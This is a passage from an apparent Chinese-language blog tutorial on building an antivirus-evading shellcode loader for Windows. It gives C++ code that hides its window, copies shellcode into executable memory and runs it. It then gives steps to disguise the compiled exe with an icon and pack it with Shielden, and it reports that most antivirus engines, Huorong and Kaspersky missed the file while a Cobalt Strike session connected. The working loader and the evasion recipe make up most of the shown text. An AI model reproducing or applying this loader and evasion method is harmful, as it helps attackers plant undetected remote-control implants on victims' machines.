函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)                        <span class="comment">//去除窗口</span></span></span><br><span class="line"><span class="comment">//步骤b所在桌面产生的 shellcode.c的内容;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW);</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Visual Studio中新建控制台应用程序并复制代码</p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/848c9909-f79a-4d4d-a14d-8adadbf2d270.png" alt="imgbed.cn图床"></p><p>按如图设置编译选项</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/afd7a7bd-5ad8-4a2d-bc55-9fea6c9e4c57.png" alt="imgbed.cn图床"></a></p><p>选择重新生成解决方案，生成ConsoleApplication4.exe</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/be996b9f-eb07-4d1b-9fd8-b53ff6524b03.png" alt="imgbed.cn图床"></a></p><h2 id="使用用Restorator-2018为生成的exe文件添加图标"><a href="#使用用Restorator-2018为生成的exe文件添加图标" class="headerlink" title="使用用Restorator 2018为生成的exe文件添加图标"></a>使用用Restorator 2018为生成的exe文件添加图标</h2><p>将ConsoleApplication4.exe拖入Restorator 2018，右键选择添加资源，名称可随意填写</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/05b62602-dc02-4910-b719-0aece94f7419.PNG" alt="imgbed.cn图床"></a></p><p>将ico文件拖入Restorator 2018并保存</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/e39947a4-6d66-4a19-94e1-40670743ea9b.PNG" alt="imgbed.cn图床"></a></p><h2 id="运用shielden为exe文件加壳"><a href="#运用shielden为exe文件加壳" class="headerlink" title="运用shielden为exe文件加壳"></a>运用shielden为exe文件加壳</h2><p>设置如下</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/4978b4bc-0ef5-4b6d-b997-1b5b1a7b9d72.png" alt="imgbed.cn图床"></a></p><h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p>virustotal.com上 shellcode_launcher.exe 查杀率为17/71  </p><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/0aa77773-af58-4324-9c6b-e51286f459b2.png" alt="imgbed.cn图床"></p><p>本地测试，静态扫描火绒与卡巴斯基均不查杀</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d405eea2-6054-42ce-9e01-2d5285c040c9.PNG" alt="imgbed.cn图床"></a></p><p>cs上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/52a16bf0-671d-47fa-94ea-5877e7dfd8df.png" alt="imgbed.cn图床"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.xljtj.com/archives/c-shellcode.html?from=timeline&isappinstalled=0">使用 C 编译 shellcode 免杀上线</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
